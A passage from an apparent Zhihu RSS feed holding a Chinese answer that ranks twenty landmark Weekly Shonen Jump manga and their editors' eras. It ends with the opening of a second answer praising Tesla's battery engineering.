data-pid=\"4cjPNBm-\">《少年jump》已经死了...如果没有《北斗神拳》的话。</p>\n<p data-pid=\"iXsFaOiM\">80年代初顶住《少年sunday》恋爱喜剧旋风的最大功臣，送《少年jump》销量突破400万大关，让三代西村繁男保住了自己的饭碗。</p>\n<p data-pid=\"oCK25DZ8\">也是后来的五代编辑长堀江信彦的得意之作。</p>\n<p data-pid=\"-VWIVBs0\">废土末世的世界观搭建，拳脚相加的搏击画面都给后世《少年jump》的战斗漫画带来极其深远的影响，在“毅力体育”或“热血打架”之外，开辟出了一种新的王道漫画风格的可能性，并成为后世的主流。</p>\n<h3>（6）龙珠（ドラゴンボール 鳥山明 1984）</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-a6aa9f323f4005b927c2028572badb17_720w.jpg?rss\" data-rawwidth=\"367\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a6aa9f323f4005b927c2028572badb17\" data-watermark-src=\"v2-9a1b17c29a4cafa2a3cb14255744c4b8\" data-private-watermark-src=\"v2-6d912183be3ec46c93ed9eb9dc8f5085\"></p>\n<p data-pid=\"b-J11BpU\">久等了！</p>\n<p data-pid=\"3vCsoFOw\">原本的搞笑冒险漫画因为补《筋肉人》休刊的坑一跃而成武林盟主一统江湖，一如《男儿当大将》故事。</p>\n<p data-pid=\"ks5C9FVK\">《龙珠》一出，谁与争锋？</p>\n<p data-pid=\"PMd2Dhh9\">鸟岛和彦才能的最佳例证，也是鸟山明才能的充分体现。在《北斗神拳》的基础之上，正式定义了什么叫“王道”，什么叫“战斗”，什么叫《少年jump》的味道。</p>\n<p data-pid=\"g3CEdW2N\">之后的几十年一直到现在，《少年jump》的主流风格里一直流淌着它的血液。</p>\n<h3>（7）电影少女（電影少女 桂正和 1989）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-3b35501e1673e1f55c0f679509167c11_720w.jpg?rss\" data-rawwidth=\"392\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3b35501e1673e1f55c0f679509167c11\" data-watermark-src=\"v2-eb006d76bbe10d4c2216a7b1b3cde136\" data-private-watermark-src=\"v2-9a316d8c2bb93750407eef0f5d01bbab\"></p>\n<p data-pid=\"_o26R4ad\">总之是想放个桂正和在这里，作品是哪一部其实不算特别重要。</p>\n<p data-pid=\"UtayUORJ\">在鸟岛和彦的坚持下，《少年jump》终于出现了符合时代潮流的恋爱喜剧漫画（我知道《橙路》比这个更早）。</p>\n<p data-pid=\"dv4c0Ey-\">如果说永井豪和本宫宏志扶持长野规走过了《少年jump》创刊期的艰辛，那鸟山明和桂正和就是配合鸟岛和彦渡过了《少年jump》转型期的阵痛。</p>\n<p data-pid=\"qxRJaWAn\">时代不同了，该转变老旧的思想了。时任四代编辑长后藤广喜没想通，但是鸟岛和彦早早想明白了。</p>\n<p data-pid=\"mXAhUFXf\">一定要说的话，《电影少女》融合了科幻要素，既符合桂正和自己的喜好，也算是一种崭新风格的尝试，与后来纯粹的恋爱喜剧相比更有特点一些，所以让其入选。</p>\n<hr>\n<p data-pid=\"RmuYWOoR\">四代编辑长后藤广喜时代，编辑长的存在感比较稀薄。反倒是手下一众有能编辑光彩夺目，堀江信彦（五代编辑长）发掘了原哲夫和北条司，鸟岛和彦（六代编辑长）带来了鸟山明与桂正和，而高桥俊昌（七代编辑长）则比较运气差一点，他负责的是松本泉和...嗯萩原一至（更麻烦的还在后头呢）。</p>\n<p data-pid=\"gjn-RGQv\">恋爱喜剧风潮吹动少男少女的心，大友克洋革命带动业界大踏步前进，无论是内容还是形式，《少年jump》都得学着适应时代，而不是固步自封。</p>\n<p data-pid=\"xZrCXJXN\">一些陪跑作品：</p>\n<p data-pid=\"H5T8ycP_\"><b>《拳王创世纪》&amp;《圣斗士星矢》</b>，车田正美曾创出了很多战斗漫画的表现技法，但很快就被《北斗神拳》和《龙珠》覆盖掉了；车田正美曾带动《少年jump》的销量大幅上涨，但似乎传播度还比不上《阿拉蕾》。属于他的时代真的太短，短到无法代表某个历史阶段。</p>\n<p data-pid=\"JgxqsHgz\"><b>《筋肉人》</b>，学《拳王创世纪》才火起来的作品，《拳王创世纪》都陪跑了，它不陪跑不合适。</p>\n<p data-pid=\"f7II18vL\"><b>《足球小将》</b>，其实单说《少年jump》历史地位的话，怎么也该它入选的，但是体育类作品除了那一部之外真的都谈不上是《少年jump》自己的风格，所以只有20个作品的前提下留给体育类作品的名额实在有限。</p>\n<p data-pid=\"aJhUyFZs\"><b>《橙路》</b>，没办法，有桂正和了。况且恋爱喜剧是《少年sunday》的拿手好戏，《少年jump》也不过是追随潮流而已，从这点上来说，恋爱喜剧类和体育类作品在《少年jump》上的处境有些相似——有，但不太有自己的风格。</p>\n<p data-pid=\"HLvrWatb\"><b>《城市猎人》</b>，很纠结但是没办法，这种偏青年向的风格在《少年jump》上注定是昙花一现。堀江信彦最突出的功绩反倒是在他没当上编辑长的时候，想想也挺讽刺的。</p>\n<p data-pid=\"DuTEb5wb\"><b>《达伊的大冒险》</b>，有《游戏王》这个更适合讨论跨媒介的例子，就不提这个了。</p>\n<hr>\n<h3>（8）JOJO的奇妙冒险 星尘斗士 （ジョジョの奇妙な冒険 スターダストクルセイダース \t荒木飛呂彦 1989）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-87ed5868ce7511583a0319480ba72b5a_720w.jpg?rss\" data-rawwidth=\"333\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-87ed5868ce7511583a0319480ba72b5a\" data-watermark-src=\"v2-45f151471b4b650a89c0db41d1953fbb\" data-private-watermark-src=\"v2-efd695b799ab7e172ba0e2d187193be5\"></p>\n<p data-pid=\"LQC5kzUD\">ゴゴゴゴゴゴゴ！</p>\n<p data-pid=\"6--TuLZN\">荒木的jojo系列必然要在这里有个位置，只是时间早晚的问题。</p>\n<p data-pid=\"ucCBq1Gu\">选择星尘斗士这一部主要是因为超能力战斗的标志“替身”诞生在此。</p>\n<p data-pid=\"BgaMMCoa\">开创了超能力战斗的风格，打破了只能靠肉博的僵局。在《龙珠》的基础上，给后世《少年jump》战斗漫画的血脉里注入了全新活力。</p>\n<h3>（9）灌篮高手（SLAM DUNK 井上雄彦 1990）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-587efea7ba5c138ce0dbba7a2a34683b_720w.jpg?rss\" data-rawwidth=\"318\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-587efea7ba5c138ce0dbba7a2a34683b\" data-watermark-src=\"v2-12abc3000cf8a1fb4a3b61f148577519\" data-private-watermark-src=\"v2-c759bb909d835a55d121cff51d835bd2\"></p>\n<p data-pid=\"BAD-YPBS\">你没猜错，“那一部”体育类作品就是灌篮高手。</p>\n<p data-pid=\"folqaWAm\">与《龙珠》并驾齐驱的“黄金期三台柱”之二。</p>\n<p data-pid=\"d4GWxqZd\">把运动与青春热血完美结合，开创了“篮球漫画”这一之前无人问津的运动漫画题材，再加上流畅的分镜技术，以上三点让《少年jump》的体育漫画总算走出了一些自己的风格，也让井上雄彦必须在这里有一个位置。</p>\n<p data-pid=\"AQMeNjOx\">感觉后来的《排球》完全走的是同样的路子。</p>\n<p data-pid=\"uhy1peFn\">与此同时和编辑部谈不拢就撂挑子走人的强硬作风是杂志历史罕见的异数，比富坚义博还要更刚烈，是那个转型期《少年jump》繁荣之下潜藏混乱的最佳写照。</p>\n<h3>（10）浪客剑心（るろうに剣心 -明治剣客浪漫譚- 和月伸宏 1994）</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-2ef4a9b74c849e6f0452db283c23a4b7_720w.jpg?rss\" data-rawwidth=\"367\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2ef4a9b74c849e6f0452db283c23a4b7\" data-watermark-src=\"v2-02fb92fb30382a7b56200907f969f967\" data-private-watermark-src=\"v2-623c7cbbe6d1ebfb508da7da36d90098\"></p>\n<p data-pid=\"UPt946gM\">将剑客题材推向热潮，历史功绩+5</p>\n<p data-pid=\"-ic6tvUD\">将少女漫画的技法与少年漫画的风格融合，历史功绩+10</p>\n<p data-pid=\"-imt5eeJ\">培养出一批新人漫画家（以及影响了岸本齐史），历史功绩+30</p>\n<p data-pid=\"lMstQOJF\">顶住世纪末黑暗期的压力，历史功绩+100</p>\n<p data-pid=\"FV2oC9eC\">五代编辑长堀江信彦和六代编辑长鸟岛和彦的两朝老臣，后来的九代编辑长佐佐木尚是其责编和亲密战友。要问哪个作品最能代表那个时期，除了《浪客剑心》我想不出其他答案了。</p>\n<hr>\n<p data-pid=\"VgYBmOvi\">气象万千又变化多端的世纪末，有黄金期的丰富多彩也有黑暗期的荒凉萧索。堀江信彦离去带走了原哲夫与北条司，鸟岛和彦回归带回了高桥俊昌和全新的方向，《少年jump》这艘忒休斯之船在不知不觉间已经与本宫宏志那个时代有了天翻地覆的变化。</p>\n<p data-pid=\"ojAOGjBZ\">一些陪跑作品：</p>\n<p data-pid=\"AZo3767p\"><b>《幽游白书》</b>，黄金期三台柱之一，横向对比不如《龙珠》、《灌篮高手》那么有开创性，纵向对比又不如同作者的《猎人》完善，整个作品更像是凭借富坚义博的才华缝在一起的流行短剧。值得注意的是融入了少女漫画/恋爱喜剧漫画的技巧在其中，但这一点又不如后辈《浪客剑心》做得更到位，只能忍痛割爱。</p>\n<p data-pid=\"5ALhIxwM\"><b>《封神演义》</b>，藤崎龙是鬼才，但这个作品出现的太早了，当时的《少年jump》和当时的藤崎龙还没有完全准备好。亦庄亦谐的调性某种程度上可以视为《银魂》的前身，至于看似荒诞不经实际上隐藏了超展开的内容...这种满嘴长牙净唠X磕的风格还得再沉淀个二十年，交给一个叫藤本树的年轻人来呈现。</p>\n<hr>\n<h3>（11）游戏王（遊☆戯☆王 高橋和希 1996）</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-b4d8e3dcf34366437510dd620ebd25ba_720w.jpg?rss\" data-rawwidth=\"308\" data-rawheight=\"475\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b4d8e3dcf34366437510dd620ebd25ba\" data-watermark-src=\"v2-6f57ca087cdc1fd8f92b3fe26c0c7c59\" data-private-watermark-src=\"v2-bdda2a1f9d8d34b4dc30ed2d03ee5ffe\"></p>\n<p data-pid=\"69a-r-W6\">第六代编辑长鸟岛和彦“开展跨媒介”方针的最大成果，代表了鸟岛政权给《少年jump》带来的全新可能性。</p>\n<p data-pid=\"1K6NdNAU\">“用游戏去战斗”打开了战斗漫画的新思路，不是靠漫画，而是靠卖牌赚疯了，高桥和希可不和你开玩笑。</p>\n<p data-pid=\"diEBEYMj\">同样是鸟岛和彦的跨媒介，《游戏王》比《达伊的大冒险》享有更好的时代机遇，也有更完善更丰富的开发效果，况且它是从属于《少年jump》自己的独立IP。</p>\n<p data-pid=\"FFYHRSRH\">说《少年jump》的跨媒介开发，就得说鸟岛和彦；说鸟岛和彦的跨媒介开发，就得说《游戏王》，就是这么个地位。</p>\n<p data-pid=\"21vRdxu8\">在十多年以后大杀特杀的“鬼瓶”十代编辑长瓶子吉久是其责编。</p>\n<h3>（12）海贼王（ONE PIECE 尾田栄一郎 1997）</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-2f32a1471e130319f4445ce6f0c8cc5a_720w.jpg?rss\" data-rawwidth=\"299\" data-rawheight=\"475\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-2f32a1471e130319f4445ce6f0c8cc5a\" data-watermark-src=\"v2-06ea0b57730c28ffa733509ecdbff193\" data-private-watermark-src=\"v2-28e7bd8141125f2ba66ac07f0bd185a4\" data-tags=\"porn\"></p>\n<p data-pid=\"mQfiozg0\">《少年jump》战斗漫画的完成品，的二分之一。</p>\n<p data-pid=\"6LVcBSux\">配方大概是45%本宫宏志/车田正美+25%鸟山明/原哲夫+20%和月伸宏+10%荒木飞吕彦/富坚义博，能明白我啥意思就行。</p>\n<p data-pid=\"NnVFVm4c\">集合了前人的所有智慧结晶，世界观、动作戏、人情剧、能力战该有的都有了（记住这句话，后面还会出现）。</p>\n<p data-pid=\"OmKS8Deg\">尾田荣一郎的长处在于宏观层面对故事的掌控力，薄弱的部分则是微观层面对战斗场景的刻画（我想这也是鸟岛和彦不看好它的原因）。</p>\n<p data-pid=\"PTfUQbF7\">第七代编辑长高桥俊昌嫡系中的嫡系，新世纪前十五年《少年jump》与其荣辱与共，它的大世界、大舞台、超长主线的风格甚至对同杂志其他作品产生了不少影响。</p>\n<p data-pid=\"lM5nD21P\">虽然还没能盖棺定论，但不影响它时代领航者的地位。</p>\n<h3>（13）猎人（HUNTER×HUNTER 冨樫義博 1998）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-76a4d9b31e4666d7d2f4bba80da79a84_720w.jpg?rss\" data-rawwidth=\"300\" data-rawheight=\"473\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-76a4d9b31e4666d7d2f4bba80da79a84\" data-watermark-src=\"v2-0d67122db40d9d679f496d3af7165ecd\" data-private-watermark-src=\"v2-87c1a3b258b907afa532e1eeb7b12a33\"></p>\n<p data-pid=\"OcIvySXO\">比起《幽游白书》，这部作品真正体现出了完全体的富坚义博有多么可怕。</p>\n<p data-pid=\"RuGPm9wA\">和《海贼王》前后脚诞生，共同昭示着上世纪末《少年jump》的战斗漫画风格已臻大成。区别在于尾田荣一郎是站在无数前人的肩膀上，而富坚义博就是富坚义博（可能还是有些鸟山明和荒木的影子）。</p>\n<p data-pid=\"szDyd8-g\">没有被《幽游白书》末端以及《浪客剑心》的路子影响从而陷入到无休止的“正邪讨论”、“道德困境”、“感情纠葛”当中去，回顾初心寻找战斗本身的趣味。在荒木的基础上把超能力智斗升级成了更严谨更体系化的2.0版本，对后世超能力战斗漫画影响更大一些。</p>\n<p data-pid=\"HE0YHruc\">贪婪之岛篇后开始疯狂试探少年漫画和战斗漫画的边界，在开辟新航路的方向上一去不回（这是双关）。</p>\n<h3>（14）火影忍者（NARUTO -ナルト- 岸本斉史 1999）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-c82560b1cf61294d2321f434ff27b7e1_720w.jpg?rss\" data-rawwidth=\"304\" data-rawheight=\"475\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c82560b1cf61294d2321f434ff27b7e1\" data-watermark-src=\"v2-0a85d7fcefc84ab2e021b7cd385ef185\" data-private-watermark-src=\"v2-8922f21f5f796107f52e0542c279fff1\"></p>\n<p data-pid=\"DLR5DCA4\">《少年jump》战斗漫画的完成品，的二分之一。</p>\n<p data-pid=\"4Jzor_hK\">和《海贼王》一时（指快二十年）瑜亮，是这个时代的双子星。</p>\n<p data-pid=\"03ao3RXw\">配方大概是20%本宫宏志/车田正美+35%鸟山明/原哲夫+15%和月伸宏+30%荒木飞吕彦/富坚义博，能明白我啥意思就行。</p>\n<p data-pid=\"DZOmVmQZ\">集合了前人的所有智慧结晶，世界观、动作戏、人情剧、能力战该有的都有了。</p>\n<p data-pid=\"DDWWhvky\">岸本齐史的长处在于微观层面对战斗场景的刻画，薄弱的部分则是宏观层面对故事的掌控力（我想这也是许多读者怒喷烂尾的原因）。</p>\n<p data-pid=\"ywqAFTEi\">非常被动地接受《海贼王》的影响，风格不得不往《海贼王》方向靠拢，结果暴露了自己的许多弱点。</p>\n<p data-pid=\"1A4-ruCt\">已经可以盖棺定论了，是千年老二。</p>\n<hr>\n<p data-pid=\"zuNgFl_P\">鸟岛·高桥体制贯彻下来以后，基本上无限接近我们熟悉的《少年jump》的样子了。算是《少年jump》最后的好时代，再之后二十多年的《少年jump》基本上只是在消耗此前积累的遗产而已。</p>\n<p data-pid=\"rZRAdigZ\">一些陪跑作品：</p>\n<p data-pid=\"R3sLakaf\"><b>《I''s》</b>，又是桂正和，其实换这个上去，换《电影少女》下来也可以，本质上是相同的。</p>\n<p data-pid=\"T2Z3M92f\"><b>《棋魂》</b>，很纠结但是没办法，和《城市猎人》一样这种风格在《少年jump》上太少见了，其实很有份量，只是同时期其他几个作品太有份量了。</p>\n<p data-pid=\"Rj9g4Ytj\"><b>《通灵王》</b>，也是世纪末战斗漫画的集大成作品，就是武井宏之志大才疏，实在难当此重任。况且还钻牛角尖，自己把自己带沟里了，着实可惜。</p>\n<p data-pid=\"miKfVV02\"><b>《网球王子》</b>，体育类作品，还是之前说过的问题。不过这种偶像男团化的风格倒是打开了后来作品的思路（比如《黑子的篮球》）。</p>\n<hr>\n<h3>（15）死亡笔记（DEATH NOTE 大場つぐみ（原作）、小畑健（作画）2003）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-56e3a7896e038296e7da8a4076463a19_720w.jpg?rss\" data-rawwidth=\"766\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-56e3a7896e038296e7da8a4076463a19\" data-watermark-src=\"v2-3c2221765a7e9a3ead4e7abea145c682\" data-private-watermark-src=\"v2-a6540e5197528acc8c563abe2960954b\"></p>\n<p data-pid=\"BMZGeIaF\">世纪初的《少年jump》作品大多是些陈词滥调（cliche），还得是《死亡笔记》才能引爆社会话题。</p>\n<p data-pid=\"Qul9YpVZ\">这种风格的作品对《少年jump》来说无疑是一记重磅炸弹。</p>\n<p data-pid=\"mrz50zEt\">从此“王道”不再是《少年jump》故事漫画的唯一答案，不依赖战斗、体育、恋爱（或者说卖肉）的“邪道”开始走向台前。</p>\n<p data-pid=\"NNDq8u-v\">风格迥异的题材出现在杂志上，某种程度上也算八代编辑长茨木政彦无为而治方针的一个例证。</p>\n<h3>（16）银魂（銀魂 空知英秋 2004）</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-bea5b76eb86ad0460beeeabef4918c93_720w.jpg?rss\" data-rawwidth=\"367\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bea5b76eb86ad0460beeeabef4918c93\" data-watermark-src=\"v2-45661abc7270241dd6a15ef581168477\" data-private-watermark-src=\"v2-5164e49ed58e17ad9363a26933317b67\"></p>\n<p data-pid=\"vx2hJZ4I\">气质非常独特的作品，《少年jump》一直都是故事漫画和搞笑漫画两条腿走路，到它这直接两条并一条了，此乃前无古人的创举。</p>\n<p data-pid=\"xwaFD9vC\">如果说《破廉耻学园》是六七十年代日本年轻人反叛精神的写照，《银魂》就是新世纪平成废柴的心灵故乡。</p>\n<p data-pid=\"vIMEvQJ7\">也不是不想热血一把，但世界这么复杂我还是管好自己得了。时代变了，只有“我的剑能到达的范围”才是“我的国家”。</p>\n<p data-pid=\"pGqPKNaO\">好死不如赖活着，《银魂》作品的结局就如同这个主题一般，硬是在鬼瓶的手下苟到了最后。</p>\n<p data-pid=\"N7m_36Sp\">又喜感又丧气，挺好的。</p>\n<hr>\n<p data-pid=\"WlhEr3zT\">高桥俊昌因为突发疾病去世，才换上了茨木政彦接管大权，不知道这件事对《少年jump》的发展影响有多深远，但进入新世纪以后杂志的发展确实有点平庸。</p>\n<p data-pid=\"b3TYwzTZ\">一些陪跑作品：</p>\n<p data-pid=\"5O9N9E4m\"><b>《死神》</b>，和《海贼王》、《火影忍者》活跃时间严重重合，就像王老吉和加多宝打架把和其正搞没了，老三就是这么悲惨。同样的王道，同样的战斗，同样的集大成，但各方面总是比《海》和《火》差那么点意思，虽然诗人的风格对后来的作品影响也不小，但放在同时代来说反倒不如上面两个作品更有突破性。</p>\n<p data-pid=\"ZNiuvtCb\"><b>《驱魔少年》&amp;《家庭教师》&amp;《美食的俘虏》&amp;《滑头鬼之孙》&amp;《恶魔奶爸》等</b>，都挺好，都各有特色，就是太套路了，缺乏突出于时代的特质。</p>\n<p data-pid=\"JMCrizxU\"><b>《黑子的篮球》</b>，作为超能力体育系作品，没能入选的原因和《网球王子》差不多；作为见好就收的作品，又不如后面的《暗杀教室》典型，放在这提一下吧。</p>\n<p data-pid=\"lOAJ_oXz\"><b>《爆漫王》</b>，让人很纠结但非常可惜，作为讲述漫画家职业的作品加深了无数读者对“编辑部”、“调查表”、“连载顺位”等东西的了解，用最王道的风格讲了一个最不王道的故事，如果是历史前30或者前25肯定有它一席之地。</p>\n<p data-pid=\"RHX4bGO0\"><b>《出包王女》</b>，这个作品据说是开启了《少年jump》卖肉类的先河，但总觉得不是什么可以拿到台面上说的东西，就还是不展开说了吧。</p>\n<hr>\n<h3>（17）暗杀教室（暗殺教室 松井優征 2012）</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-b95be77f1d7c7cbd8f2447180813ca5f_720w.jpg?rss\" data-rawwidth=\"759\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b95be77f1d7c7cbd8f2447180813ca5f\" data-watermark-src=\"v2-d758a9c7585384cfe33adfe683479047\" data-private-watermark-src=\"v2-17711fc8221f5fac16f9224bde17419a\"></p>\n<p data-pid=\"cad5T5S3\">一方面，在别开生面的非王道设定中融入了更多的战斗要素（但不依赖必杀技、集团战或者打擂台等传统的战斗要素）在其中，可以视为是“邪道”漫画的进一步发展。</p>\n<p data-pid=\"auD6u8f0\">《约定的梦幻岛》算是其继承人吧。</p>\n<p data-pid=\"9koxm2EQ\">另一方面，高开高走，该完结就完结，在十代编辑长瓶子吉久任期内作出了非常好的表率作用，宣告了《少年jump》的重心要从“长篇”甚至“超长篇”作品转向“中短篇”，具有划时代的意义。</p>\n<p data-pid=\"DGlzxEnI\">茨木和佐佐木在位时杂志开始“超长篇战斗漫画”的大内卷时代，十代编辑长瓶子吉久当斩则斩，一如鸟岛和彦故事。</p>\n<h3>（18）鬼灭之刃（鬼滅の刃 吾峠呼世晴 2016）</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-3382fac35d82f5a7d8dabdc8ce852eab_720w.jpg?rss\" data-rawwidth=\"1312\" data-rawheight=\"2064\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3382fac35d82f5a7d8dabdc8ce852eab\" data-watermark-src=\"v2-e7b914a5fd56ec31e4cc61bedefd80da\" data-private-watermark-src=\"v2-c6c5ad7ed6f8a901426e71ea91cc7360\"></p>\n<p data-pid=\"kVXVr7gE\">虚假的救世主：“世纪末救世主”北斗神拳，最后自身难保跟编辑跑路了。</p>\n<p data-pid=\"yAqKQL_p\">真正的救世主：“平成末救世主”鬼灭之刃，在其不可思议的销量面前，《海贼王》不过是旧时代的残党。</p>\n<p data-pid=\"JecLWtN3\">拯救了《少年jump》，也拯救了业界。原以为要穷途末路了的杂志开始回暖，为后续其他的作品激活了整个市场。</p>\n<p data-pid=\"Im8qrW68\">作品风格上并无创新突破，只能说做出了适合当下时代的调整（温暖人情、残酷战斗、动画和社交媒体传播）。</p>\n<p data-pid=\"Oy5v11oU\">也许真如荒木所说，“如今的漫画已经不再进化了，只是在发展而已”。</p>\n<h3>（19）咒术回战（呪術廻戦 芥見下々 2018）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-48468da3b765928b882db4e9b97c9f77_720w.jpg?rss\" data-rawwidth=\"760\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-48468da3b765928b882db4e9b97c9f77\" data-watermark-src=\"v2-659608f066377887a06aefbafe3455fe\" data-private-watermark-src=\"v2-e86bdef0edfc620a916acac7774ba731\"></p>\n<p data-pid=\"hlNT45AP\">经历了《我的英雄学院》、《黑色五叶草》等作品的试错之后，《少年jump》找到的新时代下王道战斗漫画的样本。</p>\n<p data-pid=\"Jd0IT-yR\">以“幽灵”为主题的作品终于站在了《少年jump》舞台的最中央，让《幽游白书》、《死神》等前辈扬眉吐气了一回。就像《少年jump》一样，“王道战斗”漫画也是一艘忒休斯之船，历经不同时代的打磨冲刷，《咒术回战》已然呈现出与《海贼王》、《龙珠》迥异的气质。</p>\n<p data-pid=\"JJ8Tcrj7\">或者也可以说是“前富坚时代”与“后富坚时代”的差异吗？</p>\n<h3>（20）电锯人（チェンソーマン 藤本タツキ 2019）</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-9d6c447d5fc287fd19920e25591680b9_720w.jpg?rss\" data-rawwidth=\"1556\" data-rawheight=\"2457\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9d6c447d5fc287fd19920e25591680b9\" data-watermark-src=\"v2-70c3ff74c88bd3f3a76de3ac21e56893\" data-private-watermark-src=\"v2-bd83eba4b9bf417432df086a462a57a6\"></p>\n<p data-pid=\"LgWoBL2M\">鬼才藤本树相对不那么鬼才的一部作品，也是和大众口味取得了最大公约数的作品。</p>\n<p data-pid=\"djBl4LW2\">很难定义这是怎样的漫画，是王道战斗漫画进化到极致而产生的背离还是邪道漫画背离到极致而产生的对王道风格的贴合。</p>\n<p data-pid=\"krZhnDyj\">当年永井豪在《少年magazine》上连载《恶魔人》让《少年jump》眼红，如今《少年jump》终于拥有了自己的《恶魔人》。</p>\n<p data-pid=\"uqy5mka8\">我好像逐渐理解了一切，又好像没有。</p>\n<hr>\n<p data-pid=\"cfQd8JJc\">林士平、藤本树以及藤本树的助手如今已开枝散叶在《少年jump》乃至《少年jump+》上各自贡献自己的力量，和现任编辑长中野博之领导的《少年jump》相比，《少年jump+》或许才是全新时代的方向。</p>\n<p data-pid=\"nDkkwywS\">一些陪跑作品：</p>\n<p data-pid=\"KHp4L2CV\"><b>《我的英雄学院》&amp;《黑色五叶草》</b>，王道漫画模板的产物，在没有全新突破的情况下无法重现曾经的荣光。</p>\n<p data-pid=\"Mb9QjNRz\"><b>《齐木楠雄的灾难》</b>，解构王道的气质颇有点《少年jump》的《灵能百分百》的意思，不过作为短篇作品小品气息太浓了不如《暗杀教室》更具有代表性。</p>\n<p data-pid=\"8QinqR_8\"><b>《食戟之灵》</b>，美食和卖肉相结合倒是个新思路，不过也仅此而已了。</p>\n<p data-pid=\"nkRw0FEZ\"><b>《排球》</b>，很喜欢这部作品，但《灌篮高手》珠玉在前，《排》除了完成度更高之外缺乏更进一步的突破创新。</p>\n<p data-pid=\"zWNAu1bE\"><b>《演员夜凪景》，</b>十足可惜，要不是原作者自己作死，很可能开创杂志上同类型作品的先河。</p>\n<p data-pid=\"R5WTOACk\"><b>《境界触发者》</b>，十足可惜，如果作者身体再好一点，动画改编再给力一点，时代再合适一点，很可能与《咒术回战》一时瑜亮。不过现在去月刊上发展也不失为好选择。</p>\n<p data-pid=\"mNTVjux1\"><b>《石纪元》&amp;《约定的梦幻岛》</b>，风格各异，一定要说的话就是同期的《鬼灭之刃》过于耀眼了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-you-xu-duo-de-xiao-bing-qi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">许多的小兵器</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520027181/answer/2375181576?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">7 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/34747269?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《少年 Jump》历史上的各种体育类漫画应该如何排名？为什么？</a><br><a href=\"http://www.zhihu.com/question/454385612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">少年jump为什么不在中国售卖？</a><br>\n","link":"http://www.zhihu.com/question/520027181/answer/2375181576?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"都说特斯拉汽车的电池好，到底好在哪里？","date":"2022-03-11 03:09:51","description":"\n<p data-pid=\"CYiKI7-5\"><b>这题我可就太会了！毕竟特斯拉的电池我深度拆解过，也把它搞着火过！</b></p>\n<blockquote data-pid=\"9cOaxtVm\">对老王拆解特斯拉电池感兴趣的可以点文末链接观看</blockquote>\n<p data-pid=\"9-Jkw8xj\">接下来老王将从3个方面回答这个问题：</p>\n<blockquote data-pid=\"wTZMs1gt\">1、特斯拉电池到底好不好？<br>2、特斯拉电池到底好在哪里？<br>3、除了特斯拉，其它家的电池怎么样？</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-a2c3083c43dac99ada561bb6c01dacc7_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"405\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a2c3083c43dac99ada561bb6c01dacc7\" data-watermark-src=\"v2-af25ecd8101135acbbdf9ccea61fc8e2\" data-private-watermark-src=\"v2-437c0488336abe963bbb1c96cd32ec12\"></p>\n<p><br></p>\n<h3><b>1、首先，特斯拉电池到底好不好？</b></h3>\n<p data-pid=\"PtyJrZ4G\"><b>作为一个电动汽车研发工程师，我可以很负责任的说：特斯拉的电池做的真的好！</b>其实不止是电池系统，它的电驱动系统、热管理系统、电控系统都做的很不错！对，我用了个修饰词“很”！</p>\n<p data-pid=\"9XzRghY3\">没办法，在电动汽车行业里边，但凡对特斯拉技术有深入了解和分析的人基本都会认同特斯拉在电动汽车行业的地位！特斯拉的电池不管是在结构设计、控制系统架构、创新应用方面等，经常会给我们从业者一种冲击：<b>卧槽，还可以这样？！很是激进了！</b></p>\n<p 